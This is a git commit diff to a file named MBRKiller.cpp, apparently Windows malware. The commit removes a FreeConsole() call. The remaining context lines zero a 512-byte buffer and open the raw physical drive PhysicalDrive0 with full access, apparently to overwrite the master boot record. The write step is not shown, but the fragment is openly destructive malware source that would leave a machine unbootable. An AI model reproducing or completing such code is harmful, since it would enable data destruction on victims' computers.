5ecafd5b49623444d25a8d1603a548d05a0b4947
pankoza <77279607+pankoza-pl@users.noreply.github.com>
2022-05-02 12:03:03 +0200

    Update MBRKiller.cpp
    unneeded

--- MBRKiller.cpp
+++ MBRKiller.cpp
@@ -5,7 +5,6 @@ using namespace std;
 
 int main()
 {
-	FreeConsole();
 	char mbrData[512];
 	ZeroMemory(&mbrData, (sizeof mbrData));
 	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
